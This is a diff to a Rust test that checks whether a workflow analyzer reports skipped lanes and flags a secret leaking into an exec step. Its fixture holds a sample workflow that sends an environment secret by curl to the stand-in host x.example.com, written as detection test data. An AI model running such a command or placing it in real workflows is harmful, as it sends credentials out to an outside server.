@@ -940,7 +940,7 @@ fn plan_announces_the_skip_when_conformance_fails() {
 /// silent in both directions.
 #[test]
 fn dag_gated_lanes_announce_the_skip_instead_of_a_verdict() {
-    const LEAK: &str = "nika: leak\nsecrets:\n  key: { source: env, key: K }\npermits: { exec: [\"curl\"], net: { http: [\"x.example.com\"] }, fs: { read: [\"data/**\"] } }\npolicy:\n  forbid: []\ntasks:\n  send:\n    with: { k: \"${{ secrets.key }}\" }\n    exec: { command: [\"curl\", \"-d\", \"${{ with.k }}\", \"https://x.example.com\"] }\n";
+    const LEAK: &str = "nika: leak\nsecrets:\n  key: { source: env, key: K }\npermits: { exec: [\"curl\"], net: { http: [\"x.example.com\"] }, fs: { read: [\"data/**\"] } }\ntasks:\n  send:\n    with: { k: \"${{ secrets.key }}\" }\n    exec: { command: [\"curl\", \"-d\", \"${{ with.k }}\", \"https://x.example.com\"] }\n";
     let analyzable = checked_text("lanes-analyzable.nika.yaml", LEAK, false);
     assert!(
         analyzable.contains("leak into exec (task `send`)"),
@@ -952,7 +952,7 @@ fn dag_gated_lanes_announce_the_skip_instead_of_a_verdict() {
         "{LEAK}  ghost:\n    with: {{ z: \"${{{{ tasks.nope.output }}}}\" }}\n    exec: {{ command: [\"curl\", \"${{{{ with.z }}}}\"] }}\n"
     );
     let text = checked_text("lanes-skip.nika.yaml", &broken, false);
-    for lane in ["SECRETS", "GATES", "POLICY", "TRIFECTA"] {
+    for lane in ["SECRETS", "GATES", "TRIFECTA"] {
         // The placeholder makes ONE assert cover both failure shapes:
         // the lane vanished, or it printed a verdict it never computed.
         let line = text
